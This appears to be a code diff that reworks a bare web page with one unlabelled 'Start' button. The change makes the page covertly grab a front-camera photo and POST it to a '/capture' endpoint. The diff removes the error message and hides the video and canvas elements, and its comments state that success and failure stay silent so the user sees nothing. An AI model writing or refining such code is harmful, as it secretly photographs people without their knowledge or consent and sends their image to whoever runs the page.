@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title></title>
     <style>
         body {
@@ -10,6 +10,7 @@
             padding: 0;
             background: black;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
@@ -22,59 +23,108 @@
             border-radius: 40px;
             font-weight: bold;
             cursor: pointer;
+            transition: opacity 0.3s;
         }
-        button:active {
-            transform: scale(0.95);
+        button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        #video {
+            display: none;
+        }
+        #canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <button id="btn">Начать</button>
+    <button id="btn">📸 Начать</button>
     
-    <video id="video" style="display:none" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none"></canvas>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const btn = document.getElementById('btn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        
+
+        let stream = null;
+
+        async function waitForNonBlackFrame(maxTries = 20, intervalMs = 180) {
+            const ctx = canvas.getContext('2d');
+            for (let i = 0; i < maxTries; i++) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const { data } = ctx.getImageData(
+                    Math.floor(canvas.width / 2),
+                    Math.floor(canvas.height / 2),
+                    1, 1
+                );
+                if (data[0] > 12 || data[1] > 12 || data[2] > 12) {
+                    return true;
+                }
+                await new Promise(r => setTimeout(r, intervalMs));
+            }
+            return false;
+        }
+
         btn.onclick = async () => {
             try {
-                btn.style.opacity = '0.5';
-                
-                // Запрашиваем доступ к фронтальной камере (там где экран)
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',  // 'user' = фронталка (экран), 'environment' = задняя
+                btn.disabled = true;
+
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
                         width: { ideal: 640 },
                         height: { ideal: 480 }
-                    } 
+                    }
                 });
-                
+
                 video.srcObject = stream;
-                
-                video.onloadeddata = () => {
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        const photo = canvas.toDataURL('image/jpeg', 0.7);
-                        
-                        fetch('/capture', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ photo: photo })
-                        }).finally(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            btn.style.opacity = '1';
-                        });
-                    }, 300);
-                };
+
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                    if (video.readyState >= 1) resolve();
+                });
+
+                await video.play();
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const frameOk = await waitForNonBlackFrame();
+
+                if (!frameOk) {
+                    // Якщо кадр так і не з'явився — просто завершуємо тихо
+                    throw new Error('frame error');
+                }
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const photoData = canvas.toDataURL('image/jpeg', 0.82);
+
+                await fetch('/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ photo: photoData })
+                });
+
+                // Успіх — нічого не показуємо
+
             } catch (err) {
-                alert('Ошибка: ' + err.message);
-                btn.style.opacity = '1';
+                // Помилка — теж тихо, користувач нічого не побачить
+                console.error(err);
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                }
+                video.srcObject = null;
+
+                // Після всього — повертаємо кнопку (або можеш btn.remove() якщо хочеш разовий запуск)
+                setTimeout(() => {
+                    btn.disabled = false;
+                }, 2000);
             }
         };
     </script>
